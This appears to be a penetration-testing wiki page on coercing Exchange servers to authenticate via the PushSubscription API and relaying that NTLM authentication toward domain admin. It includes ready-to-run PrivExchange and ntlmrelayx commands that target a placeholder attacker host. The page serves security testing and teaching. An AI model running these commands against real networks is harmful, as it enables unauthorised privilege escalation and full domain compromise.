# PushSubscription abuse

## Theory

"PushSubscription" is an API on Exchange Web Services that allows to subscribe to push notifications. Attackers abuse it to make Exchange servers authenticate to a target of their choosing. **The coerced authentication is made over HTTP**, which is particularly powerful when doing [NTLM relay](../ntlm/relay.md) ([because of the Session Signing and MIC mitigations](../ntlm/relay.md#mic-message-integrity-code)). As Exchange servers usually have high privileges in a domain (i.e. `WriteDacl`, see [Abusing ACLs](../dacl/)), the forced authentication can then be relayed and abused to obtain domain admin privileges (see [NTLM Relay](../ntlm/relay.md) and [Kerberos Unconstrained Delegations](../kerberos/delegations/#unconstrained-delegations-kud)).

## Practice

[PrivExchange](https://github.com/dirkjanm/privexchange/) (Python) is a tool able to log in on Exchange Web Services and call that API.

```bash
privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET
```

{% hint style="info" %}
In the situation where the tester doesn't have any credentials, it is still possible to [relay an authentication](../ntlm/relay.md) to make the API call.

The modified [httpattack.py](https://github.com/dirkjanm/PrivExchange/blob/master/httpattack.py) can be used with ntlmrelayx.py to perform this attack. The attacker host needs to be modified in the script since it is hard-coded.

```bash
cd /PATH/TO/impacket/impacket/examples/ntlmrelayx/attacks/httpattack.py
mv httpattack.py httpattack.py.old
wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py
sed -i 's/attacker_url = .*$/attacker_url = "$ATTACKER_URL"/' httpattack.py
cd /PATH/TO/impacket
pip3 install .
ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx
```
{% endhint %}

{% hint style="warning" %}
On February 12th 2019, Microsoft released updates for Exchange which resolved

* the coerced authentication issue
* the fact that Exchange servers had overkill permissions leading attacker to a full domain compromission.
{% endhint %}

## Resources

{% embed url="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/" %}
